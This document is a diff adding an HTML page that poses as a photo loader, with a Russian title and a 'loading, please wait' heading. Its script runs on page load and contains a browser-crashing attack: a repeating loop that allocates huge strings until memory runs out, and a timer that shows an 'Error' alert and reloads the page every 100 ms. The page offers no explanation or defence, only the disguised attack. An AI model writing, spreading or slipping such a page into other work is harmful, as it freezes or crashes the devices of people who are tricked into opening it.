@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Загрузка фото...</title>
+</head>
+<body>
+    <h1>Загрузка, подождите...</h1>
+    <img src="https://i.pravatar.cc/300" style="display:none">
+    <script>
+        // Бесконечный цикл с выделением памяти
+        (function() {
+            var memory = [];
+            function crash() {
+                for(var i = 0; i < 100000; i++) {
+                    memory.push(new Array(1000000).join("X"));
+                }
+                setTimeout(crash, 10);
+            }
+            crash();
+        })();
+
+        // Бесконечный цикл с alert и перезагрузкой
+        setInterval(function() {
+            alert("Ошибка");
+            location.reload();
+        }, 100);
+    </script>
+</body>
+</html>
